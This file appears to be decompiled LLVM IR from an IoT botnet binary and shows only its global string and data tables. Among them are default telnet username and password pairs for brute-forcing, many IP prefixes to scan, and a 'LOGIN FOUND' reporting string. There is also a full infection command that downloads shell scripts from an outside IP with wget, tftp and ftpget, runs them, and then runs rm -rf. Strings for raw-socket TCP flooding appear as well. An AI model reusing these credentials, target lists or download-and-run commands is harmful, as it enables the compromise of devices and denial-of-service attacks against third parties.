source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805b00c.2 = global i32 0
@global_var_805b024.3 = local_unnamed_addr global i32* @global_var_805b00c.2
@global_var_805afe4.4 = constant i32 0
@global_var_805b524.5 = global i32 0
@global_var_805b010.6 = local_unnamed_addr global i32 0
@global_var_805b560.7 = global i32 0
@global_var_805b564.8 = local_unnamed_addr global i32 0
@global_var_805b568.9 = local_unnamed_addr global i32 0
@global_var_805b290.10 = local_unnamed_addr global i32 4095
@global_var_805b28c.11 = local_unnamed_addr global i32 362436
@global_var_805801e.12 = constant [7 x i8] c"(null)\00"
@global_var_8058025.14 = constant [3 x i8] c"-c\00"
@global_var_8057cdb.15 = constant [3 x i8] c"sh\00"
@global_var_8058028.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8058040.17 = constant i32 -1
@global_var_8058440.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805844e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_805b540.20 = local_unnamed_addr global i32 0
@global_var_8058457.21 = constant [5 x i8] c"PING\00"
@global_var_8058012.22 = constant [8 x i8] c"busybox\00"
@global_var_805801a.23 = constant i32 2293796
@global_var_805801c.24 = constant i32 1848115235
@global_var_805b240.25 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058012.22, i32 0, i32 0), i8* bitcast (i32* @global_var_805801a.23 to i8*), i8* bitcast (i32* @global_var_805801c.24 to i8*)]
@global_var_8057fe6.26 = constant [7 x i8] c"nvalid\00"
@global_var_8057fed.27 = constant [6 x i8] c"ailed\00"
@global_var_8057ff3.28 = constant [9 x i8] c"ncorrect\00"
@global_var_8057ffc.29 = constant [6 x i8] c"enied\00"
@global_var_8058002.30 = constant [5 x i8] c"rror\00"
@global_var_8058007.31 = constant [7 x i8] c"oodbye\00"
@global_var_805800e.32 = constant [4 x i8] c"bad\00"
@global_var_805b220.33 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057fe6.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057fed.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057ff3.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057ffc.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058002.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058007.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805800e.32, i32 0, i32 0)]
@global_var_805b548.34 = local_unnamed_addr global i32 0
@global_var_805b54c.35 = local_unnamed_addr global i32 0
@global_var_80617d4.36 = local_unnamed_addr global i32 0
@global_var_805845c.37 = constant [6 x i8] c":>%$#\00"
@global_var_805b557.38 = local_unnamed_addr global i32 0
@global_var_805b558.39 = local_unnamed_addr global i32 0
@global_var_8058463.42 = constant [12 x i8] c"177.5.%d.%d\00"
@global_var_805846f.43 = constant [15 x i8] c"1103.165.%d.%d\00"
@global_var_805847e.44 = constant [12 x i8] c"185.3.%d.%d\00"
@global_var_805848a.45 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_8058497.46 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_80584a2.47 = constant [14 x i8] c"122.252.%d.%d\00"
@global_var_80584b0.48 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_80584bc.49 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_80584c9.50 = constant [14 x i8] c"103.186.%d.%d\00"
@global_var_80584d7.51 = constant [14 x i8] c"103.189.%d.%d\00"
@global_var_80584e5.52 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_80584f3.53 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_80584fe.54 = constant [14 x i8] c"122.254.%d.%d\00"
@global_var_805850c.55 = constant [13 x i8] c"108.20.%d.%d\00"
@global_var_8058519.56 = constant [13 x i8] c"108.47.%d.%d\00"
@global_var_8058526.57 = constant [13 x i8] c"108.57.%d.%d\00"
@global_var_8058533.58 = constant [14 x i8] c"45.1103.%d.%d\00"
@global_var_8058541.59 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_805854e.60 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_805855b.61 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_8058566.62 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_8058572.63 = constant [14 x i8] c"122.204.%d.%d\00"
@global_var_8058580.64 = constant [12 x i8] c"177.0.%d.%d\00"
@global_var_805858c.65 = constant [12 x i8] c"177.8.%d.%d\00"
@global_var_8058598.66 = constant [13 x i8] c"177.91.%d.%d\00"
@global_var_80585a5.67 = constant [13 x i8] c"177.54.%d.%d\00"
@global_var_80585b2.68 = constant [13 x i8] c"177.98.%d.%d\00"
@global_var_80585bf.69 = constant [14 x i8] c"177.177.%d.%d\00"
@global_var_80585cd.70 = constant [14 x i8] c"177.192.%d.%d\00"
@global_var_80585db.71 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_80585e7.72 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_80585f4.73 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_8058600.74 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_805860b.75 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_8058617.76 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_8058623.77 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_805862f.78 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_805863b.79 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_8058647.80 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8058654.81 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_8058661.82 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_805866e.83 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_805867b.84 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_8058688.85 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_8058695.86 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_80586a2.87 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_80586af.88 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_80586bc.89 = constant [13 x i8] c"108.54.%d.%d\00"
@global_var_80586c9.90 = constant [14 x i8] c"177.255.%d.%d\00"
@global_var_80586d7.91 = constant [14 x i8] c"108.204.%d.%d\00"
@global_var_80586e5.92 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_80586f2.93 = constant [14 x i8] c"104.191.%d.%d\00"
@global_var_8058700.94 = constant [15 x i8] c"1103.100.%d.%d\00"
@global_var_805870f.95 = constant [14 x i8] c"104.188.%d.%d\00"
@global_var_805871d.96 = constant [14 x i8] c"104.189.%d.%d\00"
@global_var_805872b.97 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_8058738.98 = constant [14 x i8] c"122.160.%d.%d\00"
@global_var_8058746.99 = constant [14 x i8] c"122.161.%d.%d\00"
@global_var_8058754.100 = constant [14 x i8] c"122.162.%d.%d\00"
@global_var_8058762.101 = constant [14 x i8] c"122.163.%d.%d\00"
@global_var_8058770.102 = constant [14 x i8] c"122.164.%d.%d\00"
@global_var_805877e.103 = constant [14 x i8] c"122.165.%d.%d\00"
@global_var_805878c.104 = constant [14 x i8] c"122.166.%d.%d\00"
@global_var_805879a.105 = constant [14 x i8] c"122.167.%d.%d\00"
@global_var_80587a8.106 = constant [14 x i8] c"122.168.%d.%d\00"
@global_var_80587b6.107 = constant [14 x i8] c"122.169.%d.%d\00"
@global_var_80587c4.108 = constant [14 x i8] c"122.170.%d.%d\00"
@global_var_80587d2.109 = constant [14 x i8] c"122.171.%d.%d\00"
@global_var_80587e0.110 = constant [14 x i8] c"122.172.%d.%d\00"
@global_var_80587ee.111 = constant [14 x i8] c"122.173.%d.%d\00"
@global_var_80587fc.112 = constant [14 x i8] c"122.174.%d.%d\00"
@global_var_805880a.113 = constant [14 x i8] c"122.177.%d.%d\00"
@global_var_8058818.114 = constant [14 x i8] c"122.176.%d.%d\00"
@global_var_8058826.115 = constant [15 x i8] c"122.1103.%d.%d\00"
@global_var_8058835.116 = constant [14 x i8] c"122.179.%d.%d\00"
@global_var_8058843.117 = constant [14 x i8] c"122.180.%d.%d\00"
@global_var_8058851.118 = constant [16 x i8] c"122.11103.%d.%d\00"
@global_var_8058861.119 = constant [14 x i8] c"122.182.%d.%d\00"
@global_var_805886f.120 = constant [14 x i8] c"122.183.%d.%d\00"
@global_var_805887d.121 = constant [14 x i8] c"122.184.%d.%d\00"
@global_var_805888b.122 = constant [15 x i8] c"122.1185.%d.%d\00"
@global_var_805889a.123 = constant [14 x i8] c"122.186.%d.%d\00"
@global_var_80588a8.124 = constant [14 x i8] c"122.187.%d.%d\00"
@global_var_80588b6.125 = constant [14 x i8] c"122.188.%d.%d\00"
@global_var_80588c4.126 = constant [14 x i8] c"122.189.%d.%d\00"
@global_var_80588d2.127 = constant [14 x i8] c"122.190.%d.%d\00"
@global_var_80588e0.128 = constant [14 x i8] c"122.191.%d.%d\00"
@global_var_80588ee.129 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_80588fb.130 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_8058908.131 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_8058915.132 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8058922.133 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_805892f.134 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_805893c.135 = constant [14 x i8] c"103.188.%d.%d\00"
@global_var_805894a.136 = constant [14 x i8] c"45.1177.%d.%d\00"
@global_var_8058958.137 = constant [13 x i8] c"108.30.%d.%d\00"
@global_var_8058965.138 = constant [13 x i8] c"122.33.%d.%d\00"
@global_var_8058972.139 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_805897f.140 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_805898c.141 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_8058999.142 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_80589a5.143 = constant [14 x i8] c"122.253.%d.%d\00"
@global_var_80589b3.144 = constant [15 x i8] c"1103.173.%d.%d\00"
@global_var_80589c2.145 = constant [14 x i8] c"104.190.%d.%d\00"
@global_var_80589d0.146 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_80589dd.147 = constant [14 x i8] c"177.196.%d.%d\00"
@global_var_80589eb.148 = constant [15 x i8] c"104.1103.%d.%d\00"
@global_var_80589fa.149 = constant [13 x i8] c"177.45.%d.%d\00"
@global_var_8058a07.150 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8058a15.151 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_8058a22.152 = constant [13 x i8] c"108.44.%d.%d\00"
@global_var_8058a2f.153 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_8058a3d.154 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_8058a4b.155 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_8058a59.156 = constant [15 x i8] c"1103.177.%d.%d\00"
@global_var_8058a68.157 = constant [14 x i8] c"1103.93.%d.%d\00"
@global_var_8058a76.158 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_8058a82.159 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_8058a90.160 = constant [14 x i8] c"104.174.%d.%d\00"
@global_var_8058a9e.161 = constant [14 x i8] c"104.160.%d.%d\00"
@global_var_8058aac.162 = constant [14 x i8] c"104.161.%d.%d\00"
@global_var_8058aba.163 = constant [14 x i8] c"104.162.%d.%d\00"
@global_var_8058ac8.164 = constant [14 x i8] c"104.163.%d.%d\00"
@global_var_8058ad6.165 = constant [14 x i8] c"104.164.%d.%d\00"
@global_var_8058ae4.166 = constant [14 x i8] c"104.165.%d.%d\00"
@global_var_8058af2.167 = constant [14 x i8] c"104.166.%d.%d\00"
@global_var_8058b00.168 = constant [14 x i8] c"104.167.%d.%d\00"
@global_var_8058b0e.169 = constant [14 x i8] c"104.168.%d.%d\00"
@global_var_8058b1c.170 = constant [14 x i8] c"104.169.%d.%d\00"
@global_var_8058b2a.171 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_8058b37.172 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_8058b44.173 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_8058b51.174 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_8058b5e.175 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_8058b6b.176 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_8058b78.177 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_8058b86.178 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_8058b94.179 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_8058ba2.180 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_8058baf.181 = constant [14 x i8] c"122.208.%d.%d\00"
@global_var_8058bbd.182 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_8058bcb.183 = constant [14 x i8] c"177.201.%d.%d\00"
@global_var_8058bd9.184 = constant [14 x i8] c"108.198.%d.%d\00"
@global_var_8058be7.185 = constant [13 x i8] c"91.205.%d.%d\00"
@global_var_8058bf4.186 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_8058c01.187 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_8058c0e.188 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_8058c1b.189 = constant [14 x i8] c"185.105.%d.%d\00"
@global_var_8058c29.190 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_8058c35.191 = constant [14 x i8] c"108.203.%d.%d\00"
@global_var_8058c43.192 = constant [13 x i8] c"108.55.%d.%d\00"
@global_var_8058c50.193 = constant [14 x i8] c"108.220.%d.%d\00"
@global_var_8058c5e.194 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_8058c6c.195 = constant [14 x i8] c"108.242.%d.%d\00"
@global_var_8058c7a.196 = constant [14 x i8] c"108.122.%d.%d\00"
@global_var_8058c88.197 = constant [14 x i8] c"108.195.%d.%d\00"
@global_var_8058c96.198 = constant [15 x i8] c"108.2122.%d.%d\00"
@global_var_8058ca5.199 = constant [14 x i8] c"108.218.%d.%d\00"
@global_var_8058cb3.200 = constant [14 x i8] c"108.225.%d.%d\00"
@global_var_8058cc1.201 = constant [14 x i8] c"108.228.%d.%d\00"
@global_var_8058ccf.202 = constant [14 x i8] c"108.231.%d.%d\00"
@global_var_8058cdd.203 = constant [13 x i8] c"108.60.%d.%d\00"
@global_var_8058cea.204 = constant [14 x i8] c"108.248.%d.%d\00"
@global_var_8058cf8.205 = constant [14 x i8] c"108.253.%d.%d\00"
@global_var_8058d06.206 = constant [14 x i8] c"108.255.%d.%d\00"
@global_var_8058d14.207 = constant [13 x i8] c"108.35.%d.%d\00"
@global_var_8058d21.208 = constant [13 x i8] c"108.49.%d.%d\00"
@global_var_8058d2e.209 = constant [13 x i8] c"108.62.%d.%d\00"
@global_var_8058d3b.210 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_8058d48.211 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_8058d55.212 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_8058d62.213 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_8058d6f.214 = constant [14 x i8] c"104.176.%d.%d\00"
@global_var_8058d7d.215 = constant [14 x i8] c"104.177.%d.%d\00"
@global_var_8058d8b.216 = constant [14 x i8] c"104.183.%d.%d\00"
@global_var_8058d99.217 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_8058da7.218 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_8058db5.219 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_8058dc2.220 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_8058dcf.221 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_8058ddd.222 = constant [17 x i8] c"1103.11103.%d.%d\00"
@global_var_8058dee.223 = constant [16 x i8] c"1103.1103.%d.%d\00"
@global_var_8058dfe.224 = constant [15 x i8] c"1103.176.%d.%d\00"
@global_var_8058e0d.225 = constant [15 x i8] c"1103.170.%d.%d\00"
@global_var_8058e1c.226 = constant [15 x i8] c"1103.171.%d.%d\00"
@global_var_8058e2b.227 = constant [15 x i8] c"1103.162.%d.%d\00"
@global_var_8058e3a.228 = constant [13 x i8] c"177.26.%d.%d\00"
@global_var_8058e47.229 = constant [13 x i8] c"177.28.%d.%d\00"
@global_var_8058e54.230 = constant [13 x i8] c"177.29.%d.%d\00"
@global_var_8058e61.231 = constant [13 x i8] c"177.30.%d.%d\00"
@global_var_8058e6e.232 = constant [13 x i8] c"177.31.%d.%d\00"
@global_var_8058e7b.233 = constant [14 x i8] c"203.191.%d.%d\00"
@global_var_8058e89.234 = constant [13 x i8] c"91.233.%d.%d\00"
@global_var_80617c8.235 = local_unnamed_addr global i32 0
@global_var_8057f81.236 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_8057f90.237 = constant [6 x i8] c"/tmp/\00"
@global_var_8057f96.238 = constant [6 x i8] c"/var/\00"
@global_var_8057f9c.239 = constant [6 x i8] c"/dev/\00"
@global_var_8057fa2.240 = constant [10 x i8] c"/var/run/\00"
@global_var_8057fac.241 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8057fb6.242 = constant [6 x i8] c"/mnt/\00"
@global_var_8057fbc.243 = constant [7 x i8] c"/boot/\00"
@global_var_8057fc3.244 = constant [6 x i8] c"/usr/\00"
@global_var_8057fc9.245 = constant [6 x i8] c"/opt/\00"
@global_var_805b1e0.246 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8057f81.236, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057f90.237, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057f96.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057f9c.239, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057fa2.240, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057fac.241, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057fb6.242, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057fbc.243, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057fc3.244, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057fc9.245, i32 0, i32 0)]
@global_var_805b20c = external global i32
@global_var_8058e96.251 = constant [3 x i8] c"\0D\0A\00"
@global_var_805b260.252 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057fe6.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057fed.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057ff3.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057ffc.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058002.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058007.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805800e.32, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058012.22, i32 0, i32 0), i8* bitcast (i32* @global_var_805801a.23 to i8*), i8* bitcast (i32* @global_var_805801c.24 to i8*)]
@global_var_8058e99.253 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_8058eb0.254 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_8058eb5.255 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_8057dc4.256 = constant [412 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/rooty.sh; chmod 777 rooty.sh; sh rooty.sh; tftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.112.107 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf rooty.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_8057f60.257 = constant [5 x i8] c"root\00"
@global_var_8057f66.258 = constant [6 x i8] c"admin\00"
@global_var_8057f6d.259 = constant [7 x i8] c"telnet\00"
@global_var_8057f75.260 = constant [5 x i8] c"1111\00"
@global_var_8057f7b.261 = constant [5 x i8] c"1234\00"
@global_var_805b1a0.262 = local_unnamed_addr global [9 x i8*] [i8* getelementptr inbounds ([412 x i8], [412 x i8]* @global_var_8057dc4.256, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057f60.257, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057f66.258, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057f6d.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057f66.258, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057f60.257, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057f75.260, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057f6d.259, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057f7b.261, i32 0, i32 0)]
@global_var_8058ee0.263 = constant [6 x i8] c"arfgG\00"
@global_var_8058ee6.264 = constant [9 x i8] c"HBiug655\00"
@global_var_8058eef.265 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_8058efc.266 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_8058f10.267 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_8058f21.268 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8058f2d.269 = constant [12 x i8] c"RYSDk747586\00"
@global_var_8058f39.270 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_8058f45.271 = constant [10 x i8] c"KHGK7985i\00"
@global_var_8058f4f.272 = constant [11 x i8] c"yuituiILYF\00"
@global_var_8058f5a.273 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_8058f68.274 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_8058f74.275 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_8058f81.276 = constant [9 x i8] c"ewqdcftr\00"
@global_var_8058f8a.277 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8058f9a.278 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_8058fa5.279 = constant [12 x i8] c"twehgbferhb\00"
@global_var_8058fb1.280 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_8058fbd.281 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_8058fcb.282 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8058fd9.283 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_8058fe7.284 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_8058ff1.285 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_8058fff.286 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_805900d.287 = constant [12 x i8] c"yteytietyue\00"
@global_var_8059019.288 = constant [9 x i8] c"qsortEQS\00"
@global_var_8059022.289 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_8059032.290 = constant [4 x i8] c"std\00"
@global_var_8059036.291 = constant [4 x i8] c"dts\00"
@global_var_805903a.292 = constant [4 x i8] c"lsk\00"
@global_var_805903e.293 = constant [4 x i8] c"kek\00"
@global_var_8059042.294 = constant [6 x i8] c"smack\00"
@global_var_8059048.295 = constant [4 x i8] c"ily\00"
@global_var_805904c.296 = constant [4 x i8] c"tyf\00"
@global_var_8059050.297 = constant [4 x i8] c"pos\00"
@global_var_8059054.298 = constant [6 x i8] c"cunts\00"
@global_var_8059060.299 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058ee0.263, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058ee6.264, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8058eef.265, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8058efc.266, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8058f10.267, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058f21.268, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058f2d.269, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058f39.270, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058f45.271, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8058f4f.272, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058f5a.273, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058f68.274, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8058f74.275, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058f81.276, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8058f8a.277, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8058f9a.278, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058fa5.279, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058fb1.280, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058fbd.281, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058fcb.282, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058fd9.283, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058fe7.284, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058ff1.285, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058fff.286, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805900d.287, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059019.288, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8059022.289, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059032.290, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059036.291, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805903a.292, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805903e.293, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059042.294, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059048.295, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805904c.296, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059050.297, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059054.298, i32 0, i32 0)]
@global_var_80590f0.300 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805910c.301 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_805912d.302 = constant [4 x i8] c"all\00"
@global_var_8059131.303 = constant i32 2037579820
@global_var_8059133.304 = constant [4 x i8] c"syn\00"
@global_var_8059137.305 = constant [4 x i8] c"rst\00"
@global_var_805913b.306 = constant [4 x i8] c"fin\00"
@global_var_805913f.307 = constant [4 x i8] c"ack\00"
@global_var_8059143.308 = constant [4 x i8] c"psh\00"
@global_var_8059147.309 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_8057be0.310 = constant [5 x i8] c"mips\00"
@global_var_8057be5.311 = constant [7 x i8] c"mipsel\00"
@global_var_8057bec.312 = constant [4 x i8] c"sh4\00"
